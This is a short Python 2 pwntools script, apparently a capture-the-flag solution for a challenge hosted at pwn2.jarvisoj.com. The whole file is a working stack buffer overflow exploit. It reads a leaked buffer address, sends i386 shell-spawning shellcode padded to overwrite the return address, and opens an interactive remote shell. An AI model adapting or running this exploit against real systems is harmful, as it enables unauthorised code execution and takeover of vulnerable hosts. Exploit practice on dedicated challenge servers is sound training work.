#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

conn = remote('pwn2.jarvisoj.com', 9877)

# leak buf address
print conn.readuntil('What\'s this:'),
buf_addr = conn.readuntil('?'); print buf_addr,
print conn.read(),
buf_addr = int(buf_addr.strip('?'), 16)
log.info('buf_addr = 0x%08x' % buf_addr)

# build shellcode
shellcode = asm(shellcraft.sh())
shellcode += (0x88 - len(shellcode)) * 'A'

# send shellcode
conn.send_raw(shellcode + 'fuck' + pack(buf_addr, 32))

# get shell
conn.interactive()
